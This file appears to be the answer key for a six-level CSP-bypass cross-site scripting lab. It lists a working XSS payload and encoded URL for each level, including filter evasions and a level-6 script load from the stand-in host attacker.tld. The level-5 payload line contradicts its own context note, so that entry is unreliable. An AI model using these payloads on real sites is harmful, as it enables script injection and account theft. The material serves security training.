# cspbypass — solutions

Reflections under various CSP configurations that fail to actually prevent execution.

### cspbypass-level1

`/cspbypass/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw HTML reflection; CSP allows 'unsafe-inline'

### cspbypass-level2

`/cspbypass/level2/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside `var greeting = "Hello ..."` in nonce'd script; break the string

### cspbypass-level3

`/cspbypass/level3/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside `var data = "..."` then eval'd; break double-quoted string

### cspbypass-level4

`/cspbypass/level4/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E`

- payload: `<scr<script>ipt>alert(1)</script>`
- context: single-pass /<\/?script[^>]*>/i strip — nested tag survives

### cspbypass-level5

`/cspbypass/level5/?query=%22;al%5Cu0065rt(1);//`

- payload: `";alert(1);//`
- context: inside JS string in unsafe-inline script; `alert` keyword stripped, use \u escape

### cspbypass-level6

`/cspbypass/level6/?query=%3Cscript%20src=//attacker.tld/p.js%3E%3C/script%3E`

- payload: `<script src=//attacker.tld/p.js></script>`
- context: raw HTML reflection; script-src * permits any external host (no unsafe-inline)
